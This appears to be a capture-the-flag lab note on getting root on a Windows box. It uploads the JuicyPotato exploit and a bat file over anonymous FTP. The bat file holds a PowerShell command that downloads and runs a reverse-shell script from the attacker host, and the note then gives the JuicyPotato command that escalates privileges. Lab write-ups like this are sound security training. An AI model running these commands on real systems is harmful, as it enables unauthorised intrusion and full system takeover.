# Getting Root

## Using [JuicyPotato](https://github.com/ohpe/juicy-potato/releases)
Binary mode , to  not change the architecture  (64)
```bash
$ ftp 10.10.10.116
Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:dix): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> put jp.exe 
local: jp.exe remote: jp.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
347648 bytes sent in 3.49 secs (97.3528 kB/s)
ftp> put jp.exe 
local: jp.exe remote: jp.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
347648 bytes sent in 3.54 secs (95.9376 kB/s)
ftp>
```
![[Pasted image 20211129091152.png]]

### Create a bat file to rev shell

```bash
$ cat eris.bat 
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21/rev.ps1')"
```

upload with ftp
```bash
$ ftp 10.10.10.116
Connected to 10.10.10.116.
220 Microsoft FTP Service
Name (10.10.10.116:dix): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put eris.bat 
local: eris.bat remote: eris.bat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
89 bytes sent in 0.00 secs (1.3473 MB/s)
ftp>
```

```powerhsell
./jp.exe -t * -p C:\users\destitute\music\eris.bat -l 9001 -c '{e60687f7-01a1-40aa-86ac-db1cbf673334}'
```
![[Pasted image 20211129092945.png]]

![[Pasted image 20211129093030.png]]